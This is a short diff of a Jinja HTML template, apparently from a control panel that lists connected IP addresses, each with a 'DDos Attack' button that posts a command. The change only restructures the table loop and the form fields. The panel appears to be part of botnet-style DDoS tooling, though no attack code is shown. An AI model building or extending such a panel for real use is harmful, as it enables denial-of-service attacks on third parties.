@@ -5,12 +5,12 @@
 		<th> IP CONNECTED </th>
 		<th> comando 1 </th>
 	</tr>
+	{% for item in data %}
         <tr>
-        	{% for item in data %}
         	<th> {{ item }} </th>
-        	<th> <form action="/" method="post"> 
-			<input type="submit" name="ddosattak" value="ddosattak:{{item}}"> DDos Attack </input> 
-		</form> </th>
-        	{% endfor %}
-        </tr>
+        	<th><form action="/" method="post"> 
+				<input type="submit" name="ddosattak:{{item}}" value="ddosattak"> DDos Attack </input> 
+		</form></th>
+	</tr>
+	{% endfor %}
 {% endblock %}
